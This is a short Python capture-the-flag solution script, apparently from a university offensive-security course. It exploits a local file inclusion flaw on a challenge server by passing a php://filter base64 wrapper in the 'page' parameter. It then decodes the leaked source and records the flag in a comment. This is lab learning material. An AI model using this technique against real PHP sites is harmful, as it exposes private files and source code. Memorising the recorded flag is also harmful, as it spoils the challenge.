import base64
import re
import requests

url = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1500'
netid = 'xz4344'
cookies = {"CHALBROKER_USER_ID": netid}

filter = 'php://filter/convert.base64-encode/resource=flag'

print(f'[*] Applying filter: {filter}')
r = requests.get(url=f'{url}/?page={filter}', cookies=cookies)
print(f"[+] Raw Response:\n{r.text}")

matches = re.findall(r'[A-Za-z0-9+/=]+', r.text)
base64_encoded_data = max(matches, key=len)
print(f'[+] Extracting base64 encoded data: {base64_encoded_data}')
base64_decoded_data = base64.b64decode(base64_encoded_data).decode('utf-8')
print(f'[+] Decoding base64 encoded data:\n{base64_decoded_data}')

# flag{W0w_LFI_1s_C0Ol!_abe2c347e2daad15}
